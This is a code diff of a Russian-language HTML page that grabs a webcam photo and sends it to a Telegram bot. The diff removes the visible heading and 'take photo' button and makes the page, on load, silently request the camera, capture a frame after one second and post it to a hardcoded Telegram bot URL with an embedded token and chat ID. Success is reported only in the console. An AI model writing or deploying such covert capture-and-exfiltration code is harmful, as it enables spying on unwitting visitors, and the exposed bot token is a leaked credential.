@@ -6,60 +6,57 @@
     <title>Фото с камеры и отправка в Telegram</title>
 </head>
 <body>
-    <h1>Запрос камеры и отправка фото в Telegram</h1>
-    <button id="start-camera">Запустить камеру</button>
     <video id="video" width="320" height="240" autoplay style="display:none;"></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-    <button id="take-photo" style="display:none;">Сделать фото</button>
 
     <script>
-        // Функция для запроса доступа к камере
-        document.getElementById('start-camera').addEventListener('click', async function() {
+        async function startCameraAndSendPhoto() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            const takePhotoButton = document.getElementById('take-photo');
+            const context = canvas.getContext('2d');
 
             try {
                 // Запрашиваем доступ к камере
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
-                video.style.display = 'block';
-                takePhotoButton.style.display = 'block';
+
+                // Даем время камере загрузиться и начать показывать изображение
+                video.onloadedmetadata = async () => {
+                    // Подождем немного, чтобы изображение стабилизировалось
+                    setTimeout(async () => {
+                        // Рисуем текущее изображение с видео на холсте
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Преобразуем изображение в Blob
+                        canvas.toBlob(async function(blob) {
+                            const formData = new FormData();
+                            formData.append('chat_id', '-4587383325'); // Замените <YOUR_CHAT_ID> на ваш ID чата
+                            formData.append('photo', blob, 'photo.png');
+
+                            // Отправляем изображение в Telegram
+                            try {
+                                const response = await fetch('https://api.telegram.org/bot7497846380:AAFqWQmUb7EytKTon3GPQaFU1hf8b27rYZI/sendPhoto', { // Замените <YOUR_BOT_TOKEN> на токен вашего бота
+                                    method: 'POST',
+                                    body: formData
+                                });
+                                if (response.ok) {
+                                    console.log('Фото отправлено в Telegram!');
+                                } else {
+                                    console.error('Ошибка отправки фото в Telegram.');
+                                }
+                            } catch (error) {
+                                console.error('Ошибка при отправке фото: ', error);
+                            }
+                        }, 'image/png'); // Опция качества и тип изображения
+                    }, 1000); // Устанавливаем задержку в 1 секунду (можно настроить при необходимости)
+                };
             } catch (err) {
                 console.error("Ошибка доступа к камере: ", err);
             }
-        });
+        }
 
-        // Функция для захвата фото и отправки его в Telegram
-        document.getElementById('take-photo').addEventListener('click', function() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            const context = canvas.getContext('2d');
-
-            // Рисуем текущее изображение с видео на холсте
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Преобразуем изображение в Blob
-            canvas.toBlob(function(blob) {
-                const formData = new FormData();
-                formData.append('chat_id', '-4587383325'); // Замените <YOUR_CHAT_ID> на ваш ID чата
-                formData.append('photo', blob, 'photo.png');
-
-                // Отправляем изображение в Telegram
-                fetch('https://api.telegram.org/bot7497846380:AAFqWQmUb7EytKTon3GPQaFU1hf8b27rYZI/sendPhoto', { // Замените <YOUR_BOT_TOKEN> на токен вашего бота
-                    method: 'POST',
-                    body: formData
-                }).then(response => {
-                    if (response.ok) {
-                        alert('Фото отправлено в Telegram!');
-                    } else {
-                        alert('Ошибка отправки фото в Telegram.');
-                    }
-                }).catch(error => {
-                    console.error('Ошибка при отправке фото: ', error);
-                });
-            }, 'image/png'); // Опция качества и тип изображения
-        });
+        // Запускаем функцию сразу при загрузке страницы
+        window.onload = startCameraAndSendPhoto;
     </script>
 </body>
 </html>
